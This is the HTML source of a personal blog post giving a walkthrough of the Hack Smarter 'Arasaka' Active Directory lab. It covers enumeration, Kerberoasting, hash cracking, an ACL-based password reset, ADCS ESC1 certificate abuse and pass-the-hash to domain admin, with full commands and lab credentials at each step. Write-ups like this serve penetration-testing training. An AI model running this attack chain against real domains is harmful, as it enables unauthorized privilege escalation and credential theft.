@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Hack Smarter - Challenge Lab: Arasaka (Easy) - rt1252</title><meta name="Description" content="Write-up for Hack Smarter&#39;s Arasaka Lab."><meta property="og:url" content="http://localhost:1313/articles/write-ups/hack-smarter-arasaka/">
+  <meta property="og:site_name" content="rt1252">
+  <meta property="og:title" content="Hack Smarter - Challenge Lab: Arasaka (Easy)">
+  <meta property="og:description" content="Write-up for Hack Smarter&#39;s Arasaka Lab.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="articles">
+    <meta property="article:published_time" content="2025-11-26T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-11-26T00:00:00+00:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hack Smarter - Challenge Lab: Arasaka (Easy)">
+  <meta name="twitter:description" content="Write-up for Hack Smarter&#39;s Arasaka Lab.">
+<meta name="application-name" content="My cool site">
+<meta name="apple-mobile-web-app-title" content="My cool site">
+<meta name="referrer" content="no-referrer" /><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/articles/write-ups/hack-smarter-arasaka/" /><link rel="prev" href="http://localhost:1313/articles/write-ups/hack-smarter-building-magic/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/css/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Hack Smarter - Challenge Lab: Arasaka (Easy)",
+        "inLanguage": "en-us",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/articles\/write-ups\/hack-smarter-arasaka\/"
+        },"genre": "articles","wordcount":  563 ,
+        "url": "http:\/\/localhost:1313\/articles\/write-ups\/hack-smarter-arasaka\/","datePublished": "2025-11-26T00:00:00+00:00","dateModified": "2025-11-26T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Raymond Truex. Views do not express my employer. Content is for educational purposes only."
+            },"description": "Write-up for Hack Smarter's Arasaka Lab."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script>
+          const query = window.matchMedia('(prefers-color-scheme: dark)');
+          function applyTheme() {
+            let theme = window.localStorage?.getItem('theme') || 'dark';
+            let isDark = theme === 'dark' || (theme === 'auto' && query.matches);
+            document.body.setAttribute('theme', isDark? 'dark' : 'light');
+            document.body.setAttribute('cfg-theme', theme);
+          }
+
+          applyTheme();
+          query.addEventListener('change', applyTheme);
+        </script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="rt1252">rt1252</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/certs/"> Certs </a><a class="menu-item" href="/articles/"> Articles </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="rt1252">rt1252</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/certs/" title="">Certs</a><a class="menu-item" href="/articles/" title="">Articles</a><a class="menu-item" href="/about/" title="">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="page single special"><h1 class="single-title animate__animated animate__pulse animate__faster">Hack Smarter - Challenge Lab: Arasaka (Easy)</h1><div class="content" id="content"><h2 id="hack-smarter---challenge-lab-arasaka-easy">Hack Smarter - Challenge Lab: Arasaka (Easy)</h2>
+<p>This is my second day of doing Hack Smarter labs. This lab starts off suplying us with credentials like an assumed breach scenario. This box invovles ACL attacks and certificates.</p>
+<p>Jump to sections: <a href="#faraday" rel="">faraday</a> · <a href="#alt.svc" rel="">alt.svc</a> · <a href="#yorinobu" rel="">yorinobu</a> · <a href="#soulkiller.svc" rel="">soulkiller.svc</a> · <a href="#the_emperor" rel="">the_emperor</a></p>
+<h2 id="faraday">faraday</h2>
+<p>The first thing I like doing when landing on a box is testing the initial creds which I use nxc for.
+<code>nxc smb 10.0.19.213 -u faraday -p hacksmarter123 --shares</code></p>
+<a class="lightgallery" href="/assets/Arasaka/01_faraday_nxc.png" title="/assets/Arasaka/01_faraday_nxc.png" data-thumbnail="/assets/Arasaka/01_faraday_nxc.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/Arasaka/01_faraday_nxc.png"
+            data-srcset="/assets/Arasaka/01_faraday_nxc.png, /assets/Arasaka/01_faraday_nxc.png 1.5x, /assets/Arasaka/01_faraday_nxc.png 2x"
+            data-sizes="auto"
+            alt="/assets/Arasaka/01_faraday_nxc.png" width="1200" />
+    </a>
+<p>No interesting shares so let&rsquo;s start with BloodHound and ldapdomaindump enumeration.
+<code>bloodhound-ce-python -d hacksmarter.local -u faraday -p hacksmarter123 -ns 10.0.19.213 -c all </code></p>
+<p><code>ldapdomaindump ldap://10.0.19.213 -u 'hacksmarter.local\faraday' -p 'hacksmarter123'</code></p>
+<p>Checking the output of ldapdomaindump we can see the user <code>alt.svc</code> has SPN set so we will do a targeted kerberoast.</p>
+<a class="lightgallery" href="/assets/Arasaka/02_spn_set.png" title="/assets/Arasaka/02_spn_set.png" data-thumbnail="/assets/Arasaka/02_spn_set.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/Arasaka/02_spn_set.png"
+            data-srcset="/assets/Arasaka/02_spn_set.png, /assets/Arasaka/02_spn_set.png 1.5x, /assets/Arasaka/02_spn_set.png 2x"
+            data-sizes="auto"
+            alt="/assets/Arasaka/02_spn_set.png" width="1200" />
+    </a>
+<p><code>sudo impacket-GetUserSPNs hacksmarter.local/faraday:hacksmarter123 -dc-ip 10.0.19.213 -request-user 'alt.svc' -outputfile alt.svc_hash.txt</code></p>
+<a class="lightgallery" href="/assets/Arasaka/03_kerberoast.png" title="/assets/Arasaka/03_kerberoast.png" data-thumbnail="/assets/Arasaka/03_kerberoast.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/Arasaka/03_kerberoast.png"
+            data-srcset="/assets/Arasaka/03_kerberoast.png, /assets/Arasaka/03_kerberoast.png 1.5x, /assets/Arasaka/03_kerberoast.png 2x"
+            data-sizes="auto"
+            alt="/assets/Arasaka/03_kerberoast.png" width="1200" />
+    </a>
+<p>Now let&rsquo;s crack the hash using hashcat.</p>
+<p><code>hashcat -m 13100 alt.svc_hash.txt /usr/share/wordlists/rockyou.txt</code></p>
+<h2 id="alt.svc">alt.svc</h2>
+<p>Sweet now we have the alt.svc creds, lets quickly verify them with nxc.</p>
+<p><code>nxc smb 10.0.19.213 -u alt.svc -p babygirl1</code></p>
+<a class="lightgallery" href="/assets/Arasaka/04_nxc_alt_svc.png" title="/assets/Arasaka/04_nxc_alt_svc.png" data-thumbnail="/assets/Arasaka/04_nxc_alt_svc.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/Arasaka/04_nxc_alt_svc.png"
+            data-srcset="/assets/Arasaka/04_nxc_alt_svc.png, /assets/Arasaka/04_nxc_alt_svc.png 1.5x, /assets/Arasaka/04_nxc_alt_svc.png 2x"
+            data-sizes="auto"
+            alt="/assets/Arasaka/04_nxc_alt_svc.png" width="1200" />
+    </a>
+<p>Next we go into the BloodHound GUI and add alt.svc as owned and we check their outbound object control to find they have generic all over yorinobu.</p>
+<a class="lightgallery" href="/assets/Arasaka/05_generic_all.png" title="/assets/Arasaka/05_generic_all.png" data-thumbnail="/assets/Arasaka/05_generic_all.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/Arasaka/05_generic_all.png"
+            data-srcset="/assets/Arasaka/05_generic_all.png, /assets/Arasaka/05_generic_all.png 1.5x, /assets/Arasaka/05_generic_all.png 2x"
+            data-sizes="auto"
+            alt="/assets/Arasaka/05_generic_all.png" width="1200" />
+    </a>
+<p>Since this is just a lab we do a password change for yorinobu and then verify the change took place.</p>
+<p><code>net rpc password 'yorinobu' 'newP@ssword2022' -U 'hacksmarter.local'/'alt.svc'%'babygirl1' -S '10.0.19.213'</code></p>
+<p><code>nxc smb 10.0.19.213 -u yorinobu -p 'newP@ssword2022'</code></p>
+<a class="lightgallery" href="/assets/Arasaka/06_yorinobu_pw_change.png" title="/assets/Arasaka/06_yorinobu_pw_change.png" data-thumbnail="/assets/Arasaka/06_yorinobu_pw_change.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/Arasaka/06_yorinobu_pw_change.png"
+            data-srcset="/assets/Arasaka/06_yorinobu_pw_change.png, /assets/Arasaka/06_yorinobu_pw_change.png 1.5x, /assets/Arasaka/06_yorinobu_pw_change.png 2x"
+            data-sizes="auto"
+            alt="/assets/Arasaka/06_yorinobu_pw_change.png" width="1200" />
+    </a>
+<h2 id="yorinobu">yorinobu</h2>
+<p>We can now check out what outbound object control yorinobu has and we can see they have generic write over soulkiller.svc. We can follow the BloodHound instructions for performing a targetedKerberoast on soulkiller.svc, this will briefly add a SPN to the account we have generic write over and will show us the Kerberoasting output and then remove the SPN. The goal is to hope that the user has a weak password that we can crack.</p>
+<p><code>python3 targetedKerberoast.py -v -d 'hacksmarter.local' -u 'yorinobu' -p 'newP@ssword2022' --request-user 'soulkiller.svc'</code></p>
+<a class="lightgallery" href="/assets/Arasaka/07_targetedkerberoast.png" title="/assets/Arasaka/07_targetedkerberoast.png" data-thumbnail="/assets/Arasaka/07_targetedkerberoast.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/Arasaka/07_targetedkerberoast.png"
+            data-srcset="/assets/Arasaka/07_targetedkerberoast.png, /assets/Arasaka/07_targetedkerberoast.png 1.5x, /assets/Arasaka/07_targetedkerberoast.png 2x"
+            data-sizes="auto"
+            alt="/assets/Arasaka/07_targetedkerberoast.png" width="1200" />
+    </a>
+<h2 id="soulkiller.svc">soulkiller.svc</h2>
+<p>Next we can run hashcat to crack the password and then verify the creds using nxc.</p>
+<p><code>hashcat -m 13100 soulkiller.svc_hash.txt /usr/share/wordlists/rockyou.txt</code></p>
+<p><code>nxc smb 10.0.19.213 -u 'soulkiller.svc' -p 'MYpassword123#'</code></p>
+<a class="lightgallery" href="/assets/Arasaka/08_soulkiller_nxc.png" title="/assets/Arasaka/08_soulkiller_nxc.png" data-thumbnail="/assets/Arasaka/08_soulkiller_nxc.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/Arasaka/08_soulkiller_nxc.png"
+            data-srcset="/assets/Arasaka/08_soulkiller_nxc.png, /assets/Arasaka/08_soulkiller_nxc.png 1.5x, /assets/Arasaka/08_soulkiller_nxc.png 2x"
+            data-sizes="auto"
+            alt="/assets/Arasaka/08_soulkiller_nxc.png" width="1200" />
+    </a>
+<p>soulkiller.svc doesn&rsquo;t show anything too interesting in BloodHound, but when we check ldapdomaindump we find some useful information. The description mentions that this account is used for certificate management, immediately I am thinking certipy to check for vulnerable certificates.</p>
+<a class="lightgallery" href="/assets/Arasaka/09_soulkiller_description.png" title="/assets/Arasaka/09_soulkiller_description.png" data-thumbnail="/assets/Arasaka/09_soulkiller_description.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/Arasaka/09_soulkiller_description.png"
+            data-srcset="/assets/Arasaka/09_soulkiller_description.png, /assets/Arasaka/09_soulkiller_description.png 1.5x, /assets/Arasaka/09_soulkiller_description.png 2x"
+            data-sizes="auto"
+            alt="/assets/Arasaka/09_soulkiller_description.png" width="1200" />
+    </a>
+<p>Let&rsquo;s run a check to try to find some vulnerable templates.</p>
+<p><code>certipy find -u 'soulkiller.svc@hacksmarter.local' -p 'MYpassword123#' -dc-ip 10.0.19.213 -text -enabled -hide-admins</code></p>
+<p>We can check the output and find that <code>AI_Takeover</code> is vulnerable to ESC1.</p>
+<a class="lightgallery" href="/assets/Arasaka/10_certipy_output.png" title="/assets/Arasaka/10_certipy_output.png" data-thumbnail="/assets/Arasaka/10_certipy_output.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/Arasaka/10_certipy_output.png"
+            data-srcset="/assets/Arasaka/10_certipy_output.png, /assets/Arasaka/10_certipy_output.png 1.5x, /assets/Arasaka/10_certipy_output.png 2x"
+            data-sizes="auto"
+            alt="/assets/Arasaka/10_certipy_output.png" width="1200" />
+    </a>
+<p>Now we need to request a certificate using certipy, ESC1 lets us request a certificate for any user, I first tried administrator which did not work due to the password being expired, so we try requesting a certificate as the_emperor since they are a DA as well.</p>
+<p><code>certipy req -u 'soulkiller.svc@hacksmarter.local' -p &quot;MYpassword123#&quot; -dc-ip '10.0.19.213' -template 'AI_Takeover' -upn 'the_emperor@hacksmarter.local' -debug -target 'dc01.hacksmarter.local' -ca 'hacksmarter-DC01-CA'</code></p>
+<a class="lightgallery" href="/assets/Arasaka/11_certipy_req.png" title="/assets/Arasaka/11_certipy_req.png" data-thumbnail="/assets/Arasaka/11_certipy_req.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/Arasaka/11_certipy_req.png"
+            data-srcset="/assets/Arasaka/11_certipy_req.png, /assets/Arasaka/11_certipy_req.png 1.5x, /assets/Arasaka/11_certipy_req.png 2x"
+            data-sizes="auto"
+            alt="/assets/Arasaka/11_certipy_req.png" width="1200" />
+    </a>
+<p>Now that we have the .pfx file we can use certipy to auth as that user and get teh hash for us.</p>
+<p><code>certipy auth -pfx the_emperor.pfx -dc-ip 10.0.19.213</code></p>
+<a class="lightgallery" href="/assets/Arasaka/12_certipy_auth.png" title="/assets/Arasaka/12_certipy_auth.png" data-thumbnail="/assets/Arasaka/12_certipy_auth.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/Arasaka/12_certipy_auth.png"
+            data-srcset="/assets/Arasaka/12_certipy_auth.png, /assets/Arasaka/12_certipy_auth.png 1.5x, /assets/Arasaka/12_certipy_auth.png 2x"
+            data-sizes="auto"
+            alt="/assets/Arasaka/12_certipy_auth.png" width="1200" />
+    </a>
+<h2 id="the_emperor">the_emperor</h2>
+<p>We quickly verify the hash we received is valid using nxc.</p>
+<p><code>nxc smb 10.0.19.213 -u 'the_emperor' -H aad3b435b51404eeaad3b435b51404ee:d87640b0d83dc7f90f5f30bd6789b133</code></p>
+<a class="lightgallery" href="/assets/Arasaka/13_pwnd.png" title="/assets/Arasaka/13_pwnd.png" data-thumbnail="/assets/Arasaka/13_pwnd.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/Arasaka/13_pwnd.png"
+            data-srcset="/assets/Arasaka/13_pwnd.png, /assets/Arasaka/13_pwnd.png 1.5x, /assets/Arasaka/13_pwnd.png 2x"
+            data-sizes="auto"
+            alt="/assets/Arasaka/13_pwnd.png" width="1200" />
+    </a>
+<p>Sweet we are now DA, let&rsquo;s grab the flag. I like using evil-winrm it has many helpful built in features.</p>
+<p><code>evil-winrm -i 10.0.19.213 -u the_emperor -H d87640b0d83dc7f90f5f30bd6789b133</code></p>
+<p><code>type Administrator\Desktop\root.txt</code></p>
+<a class="lightgallery" href="/assets/Arasaka/14_root_txt.png" title="/assets/Arasaka/14_root_txt.png" data-thumbnail="/assets/Arasaka/14_root_txt.png">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/assets/Arasaka/14_root_txt.png"
+            data-srcset="/assets/Arasaka/14_root_txt.png, /assets/Arasaka/14_root_txt.png 1.5x, /assets/Arasaka/14_root_txt.png 2x"
+            data-sizes="auto"
+            alt="/assets/Arasaka/14_root_txt.png" width="1200" />
+    </a>
+</div></div></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                <a href="https://www.linkedin.com/in/ray-truex/" target="_blank" rel="noopener noreferrer" title="LinkedIn Profile">
+                    <i class="fab fa-linkedin fa-2x" aria-hidden="true"></i>
+                </a>
+            </div><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.152.2">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.1-DEV"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2025</span><span class="author" itemprop="copyrightHolder">&nbsp;Raymond Truex. Views do not express my employer. Content is for educational purposes only.</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script>window.config={"comment":{}};</script><script src="/js/theme.min.js"></script></body>
+</html>
